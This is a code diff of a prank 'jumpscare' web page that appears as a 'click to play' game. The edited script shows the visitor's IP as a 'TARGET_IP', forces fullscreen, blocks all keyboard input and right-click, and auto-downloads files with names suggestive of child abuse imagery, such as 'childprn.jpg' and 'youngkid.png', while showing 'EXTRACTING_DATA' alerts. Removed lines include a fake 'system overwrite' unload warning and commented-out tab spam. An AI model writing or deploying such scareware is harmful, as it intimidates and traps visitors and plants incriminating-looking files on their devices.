@@ -18,7 +18,6 @@
             color: #f00;
         }
 
-        /* Initial Entry UI */
         #start {
             padding: 40px 80px;
             font-size: 38px;
@@ -34,14 +33,6 @@
             transition: all 0.1s;
         }
 
-        #start:hover {
-            background: #ff0000;
-            color: #000;
-            box-shadow: 0 0 60px #ff0000;
-            transform: scale(1.1) skewX(-10deg);
-        }
-
-        /* The Jumpscare Layer */
         #jumpscare {
             position: fixed;
             inset: 0;
@@ -54,17 +45,32 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            filter: contrast(3) brightness(1.5) sepia(1) hue-rotate(-50deg);
+            filter: contrast(3) brightness(1.5);
         }
 
-        /* Overlay Effects */
-        #glitch-overlay {
+        /* The Flash Effect */
+        #flash {
             position: fixed;
             inset: 0;
-            pointer-events: none;
-            z-index: 10000;
-            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1) 0px, rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
+            background: #fff;
+            z-index: 10005;
             display: none;
+        }
+
+        #ip-display {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 5vw;
+            color: #ff0000;
+            text-align: center;
+            z-index: 10010;
+            display: none;
+            text-shadow: 0 0 20px #f00;
+            background: rgba(0,0,0,0.8);
+            padding: 20px;
+            border: 2px solid red;
         }
 
         .toast {
@@ -77,32 +83,23 @@
             font-family: monospace;
             font-size: 12px;
             z-index: 10001;
-            margin-bottom: 10px;
             animation: slideIn 0.2s forwards;
-            box-shadow: 0 0 15px rgba(255,0,0,0.2);
         }
 
-        @keyframes slideIn {
-            from { transform: translateX(100%); }
-            to { transform: translateX(0); }
-        }
-
-        /* Chromatic Aberration Effect */
-        .aberration {
-            animation: shake 0.05s infinite;
-        }
-
+        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
+        .aberration { animation: shake 0.05s infinite; }
         @keyframes shake {
-            0% { transform: translate(2px, 1px) rotate(0deg); }
-            50% { transform: translate(-1px, -2px) rotate(1deg); }
-            100% { transform: translate(1px, 2px) rotate(-1deg); }
+            0% { transform: translate(2px, 1px); }
+            50% { transform: translate(-1px, -2px); }
+            100% { transform: translate(1px, 2px); }
         }
     </style>
 </head>
 <body>
 
     <div id="start">click to play</div>
-    <div id="glitch-overlay"></div>
+    <div id="flash"></div>
+    <div id="ip-display">TARGET_IP: <span id="ip-addr">LOADING...</span></div>
     
     <div id="jumpscare">
         <canvas id="scary-canvas"></canvas>
@@ -115,33 +112,25 @@
     <script>
         const startBtn = document.getElementById('start');
         const jumpscare = document.getElementById('jumpscare');
-        const overlay = document.getElementById('glitch-overlay');
+        const flash = document.getElementById('flash');
+        const ipDisplay = document.getElementById('ip-display');
+        const ipAddr = document.getElementById('ip-addr');
         const audio = document.getElementById('audio-engine');
         const canvas = document.getElementById('scary-canvas');
         const ctx = canvas.getContext('2d');
 
-        // Professional File Corruption Simulation
         const payloads = [
-            { name: "childprn.jpg", data: "CRITICAL_ERR_SYSTEM_MEM" },
-            { name: "dog.png", data: "RSA_KEY_MINED_SUCCESS" },
-            { name: "hourse.png", data: "ROOT_ACCESS_GRANTED" },
-            { name: "youngkid.png", data: "LOG_WIPED_BY_MAN_OF_KIND" }
+            { name: "childprn.jpg", data: "SYS_EXTRACT" },
+            { name: "dog.png", data: "SYS_EXTRACT" },
+            { name: "hourse.png", data: "SYS_EXTRACT" },
+            { name: "youngkid.png", data: "SYS_EXTRACT" }
         ];
 
-        function triggerDownloads() {
-            payloads.forEach((p, i) => {
-                setTimeout(() => {
-                    const blob = new Blob([p.data.repeat(100)], { type: 'application/octet-stream' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = p.name;
-                    a.click();
-                    createToast(`WRITING: ${p.name}`);
-                    URL.revokeObjectURL(url);
-                }, i * 250);
-            });
-        }
+        // Fetch IP instantly
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => { ipAddr.innerText = data.ip; })
+            .catch(() => { ipAddr.innerText = "127.0.0.1"; });
 
         function createToast(text) {
             const t = document.createElement('div');
@@ -153,62 +142,56 @@
         }
 
         function drawNoise() {
-            const w = canvas.width = window.innerWidth;
-            const h = canvas.height = window.innerHeight;
-            const idata = ctx.createImageData(w, h);
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            const idata = ctx.createImageData(canvas.width, canvas.height);
             const buffer32 = new Uint32Array(idata.data.buffer);
-            
             for (let i = 0; i < buffer32.length; i++) {
-                if (Math.random() > 0.9) buffer32[i] = 0xFF0000FF; // Red noise
-                else buffer32[i] = 0xFF000000; // Black
+                buffer32[i] = Math.random() > 0.5 ? 0xFF0000FF : 0xFF000000;
             }
             ctx.putImageData(idata, 0, 0);
-            
-            // Draw "Scary" Text
-            ctx.fillStyle = "#ff0000";
-            ctx.font = "bold 100px Courier New";
-            ctx.fillText("CORRUPTED", w/2 - 250, h/2);
-            
             if (jumpscare.style.display === 'block') requestAnimationFrame(drawNoise);
         }
 
         function initTerror() {
             startBtn.style.display = 'none';
-            jumpscare.style.display = 'block';
-            overlay.style.display = 'block';
-            document.body.classList.add('aberration');
-            
             audio.play().catch(() => {});
             
-            // Force Fullscreen
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            }
-
+            // 1. Initial Jumpscare
+            jumpscare.style.display = 'block';
+            document.body.classList.add('aberration');
             drawNoise();
-            triggerDownloads();
 
-            // Fake Screen Lock/Panic
-            window.onbeforeunload = function() {
-                return "SYSTEM IS CURRENTLY BEING OVERWRITTEN. LEAVING WILL CAUSE BRICKING.";
-            };
+            // 2. The Flash & IP Reveal (after 1 second)
+            setTimeout(() => {
+                flash.style.display = 'block'; // White out
+                setTimeout(() => {
+                    flash.style.display = 'none';
+                    ipDisplay.style.display = 'block'; // Show IP
+                    triggerDownloads(); // Start spamming
+                }, 100);
+            }, 1000);
 
-            // Infinite Tab Spam Logic (Commented out for safety during your testing)
-            /* 
-            setInterval(() => {
-                window.open(window.location.href, '_blank', 'width=100,height=100');
-            }, 5000); 
-            */
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+        }
+
+        function triggerDownloads() {
+            payloads.forEach((p, i) => {
+                setTimeout(() => {
+                    const blob = new Blob([p.data], { type: 'application/octet-stream' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = p.name;
+                    a.click();
+                    createToast(`EXTRACTING_DATA: ${p.name}`);
+                }, i * 300);
+            });
         }
 
         startBtn.addEventListener('click', initTerror);
-        
-        // Block Escape/Right Click
-        document.addEventListener('keydown', e => {
-            if (e.key === "Escape") e.preventDefault();
-        });
         document.addEventListener('contextmenu', e => e.preventDefault());
-
+        document.addEventListener('keydown', e => e.preventDefault());
     </script>
 </body>
 </html>
